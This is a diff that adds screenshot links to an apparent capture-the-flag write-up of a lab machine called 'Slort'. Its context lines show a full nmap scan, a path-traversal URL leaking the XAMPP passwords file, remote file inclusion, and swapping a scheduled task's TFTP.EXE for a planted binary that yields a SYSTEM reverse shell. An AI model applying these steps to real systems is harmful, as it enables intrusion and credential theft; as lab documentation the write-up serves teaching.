@@ -29,6 +29,8 @@ run.
 sudo nmap -sCV -p- <TARGET_IP>
 ```
 
+![nmap service scan](./assets/slort/01-nmap.png)
+
 Directory brute-forcing on the web root found a `/site` path:
 
 ```bash
@@ -46,6 +48,8 @@ Inclusion**:
 ```
 http://<TARGET_IP>:8080/site/index.php?page=../../../../xampp/passwords.txt
 ```
+
+![LFI leaking the XAMPP passwords file](./assets/slort/02-lfi-leak.png)
 
 Testing whether the same parameter would accept a remote URL instead of a
 local path confirmed **Remote File Inclusion** was possible too — the
@@ -91,6 +95,8 @@ expected name:
 move TFTP.EXE TFTP.EXE.BAK
 copy C:\Temp\TFTP.EXE TFTP.exe
 ```
+
+![full access on the scheduled task's backup binary](./assets/slort/03-scheduled-task-backup.png)
 
 Waiting for the scheduled task's next trigger caught a reverse shell running
 as `NT AUTHORITY\SYSTEM`. Root flag retrieved.
